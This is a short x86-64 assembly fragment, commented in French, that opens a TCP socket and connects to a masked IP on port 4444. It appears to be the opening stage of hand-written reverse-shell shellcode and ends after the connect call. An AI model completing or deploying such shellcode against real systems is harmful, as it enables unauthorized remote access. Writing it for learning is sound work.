global _start

section .text
_start:

;socket parametre : inet : IPv4, sock stream = 1, 0
mov rax, 0x29 ; syscall socket
mov rdi, 2    ; inet en IPv4
mov rsi, 1    ; sock stream pour tcp
mov rdx, 0    ; protocol = 0 le noyau chosiit auto tcp
syscall

mov r12, rax  ; sauvegarde dans r12 pour eviter l'ecrasement des autres syscall 

; sockaddr 
xor rbx, rbx  ; remise a zero de rbx
push rbx      ; padding de 8
mov rbx, 0x????????      ; @ ip machine little indian
push rbx
mov rbx, 0x115c????
push rbx
mov rsi,rsp   ; rsi = pointeur vers sockaddr

mov rax, 0x2a ; syscall connect
mov rdi, r12
mov rdx, 16
syscall
